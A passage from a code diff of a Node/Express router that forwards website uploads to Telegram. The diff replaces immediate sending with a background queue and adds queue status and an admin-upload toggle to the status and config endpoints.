-      };
-      addLog(logEntry);
+    telegramQueue.push(task);
 
-      console.log(`[Telegram Server] ✅ File successfully forwarded to Telegram: "${fileName}" (${formatBytes(fileSize)})`);
+    // Trigger queue worker in background (non-blocking)
+    processTelegramQueueWorker().catch(err => {
+      console.warn('[Telegram Router] Worker launch note:', err);
+    });
 
-      return res.json({
-        success: true,
-        sent: true,
-        messageId: successfulMessageId,
-        fileName,
-        timestamp: logEntry.timestamp
-      });
-    } else {
-      stats.totalFailed++;
-      const failureReason = deliveryErrors.join(' | ') || 'فشل الإرسال إلى الوجهات المحددة';
-      const logEntry: TelegramLogEntry = {
-        id: `err_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
-        fileName,
-        fileSize,
-        fileSizeFormatted: formatBytes(fileSize),
-        category,
-        extension,
-        userId,
-        userName,
-        userEmail,
-        sourceFeature,
-        status: 'failed',
-        reason: failureReason,
-        timestamp: new Date().toISOString()
-      };
-      addLog(logEntry);
+    console.log(`[Telegram Router] Staged & Enqueued "${fileName}" (${formatBytes(fileSize)}). Queue size: ${telegramQueue.length}`);
 
-      return res.status(502).json({
-        success: false,
-        error: 'DISPATCH_FAILED',
-        message: failureReason
-      });
-    }
+    return res.json({
+      success: true,
+      queued: true,
+      queueLength: telegramQueue.length,
+      fileName,
+      sendMode,
+      destinations: destinations.map(d => d.label),
+      message: `تم إدراج الملف في طابور الإرسال الآمن إلى Telegram (المحدد: ${sendMode === 'personal' ? 'الحساب الشخصي فقط' : sendMode}) بنجاح.`
+    });
 
   } catch (error: any) {
     stats.totalFailed++;
-    console.error('[Telegram Server] ❌ Error forwarding file to Telegram:', error.message);
+    console.error('[Telegram Server] ❌ Error in forward endpoint:', error.message);
 
-    const logEntry: TelegramLogEntry = {
-      id: `err_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
-      fileName: req.file?.originalname || 'unknown',
-      fileSize: req.file?.size || 0,
-      fileSizeFormatted: formatBytes(req.file?.size || 0),
-      category: 'other',
-      extension: path.extname(req.file?.originalname || '').replace('.', ''),
-      userId: req.body.userId || 'guest',
-      userName: req.body.userName || 'unknown',
-      sourceFeature: req.body.sourceFeature || 'unknown',
-      status: 'failed',
-      reason: error.message || 'خطأ غير معروف في الاتصال بـ Telegram API',
-      timestamp: new Date().toISOString()
-    };
-    addLog(logEntry);
-
-    // CRITICAL REQUIREMENT: Telegram failure MUST NEVER fail the user's upload on the site!
     return res.json({
       success: true,
       sent: false,
       error: error.message,
-      message: 'تم استقبال الملف في الموقع بنجاح، ولكن تعذر إرسال نسخة Telegram مؤقتاً.'
+      message: 'تم استقبال الملف في الموقع بنجاح، وستتم إعادة محاولة إرساله إلى Telegram.'
     });
 
   } finally {
-    // Always clean up temp file
+    // Clean up temp file if not staged
     if (tempFilePath && fs.existsSync(tempFilePath)) {
       fs.promises.unlink(tempFilePath).catch(() => {});
     }
@@ -692,6 +1124,7 @@ router.get('/status', async (req, res) => {
   res.json({
     configured: Boolean(botToken && (chatId || groupTarget)),
     enabled: telegramConfig.enabled !== false,
+    ignoreAdminUploads: telegramConfig.ignoreAdminUploads !== false,
     hasBotToken: Boolean(botToken),
     hasChatId: Boolean(chatId),
     maskedChatId,
@@ -706,6 +1139,12 @@ router.get('/status', async (req, res) => {
       totalSkippedAdmin: stats.totalSkippedAdmin,
       totalFailed: stats.totalFailed,
       lastSentAt: stats.lastSentAt
+    },
+    queue: {
+      pending: telegramQueue.length,
+      isProcessing: isQueueWorkerRunning,
+      currentFile: currentProcessingItem?.fileName || null,
+      totalForwarded: stats.totalForwarded
     },
     recentLogs: recentLogs.slice(0, 20)
   });
@@ -729,7 +1168,8 @@ router.post('/config', async (req, res) => {
     groupTarget, 
     sendMode, 
     enabled, 
-    destinationAccount 
+    destinationAccount,
+    ignoreAdminUploads
   } = req.body;
 
   if (botToken !== undefined && botToken.trim()) {
@@ -758,6 +1198,9 @@ router.post('/config', async (req, res) => {
   if (enabled !== undefined) {
     telegramConfig.enabled = Boolean(enabled);
   }
+  if (ignoreAdminUploads !== undefined) {
+    telegramConfig.ignoreAdminUploads = Boolean(ignoreAdminUploads);
+  }
   if (destinationAccount !== undefined) {
     telegramConfig.destinationAccount = destinationAccount.trim();
   }
@@ -771,6 +1214,7 @@ router.post('/config', async (req, res) => {
     status: {
       configured: Boolean(telegramConfig.botToken && (telegramConfig.chatId || telegramConfig.groupTarget)),
       enabled: telegramConfig.enabled,
+      ignoreAdminUploads: telegramConfig.ignoreAdminUploads !== false,
       ownerPhone: telegramConfig.ownerPhone,
       ownerName: telegramConfig.ownerName,
       groupTarget: telegramConfig.groupTarget,
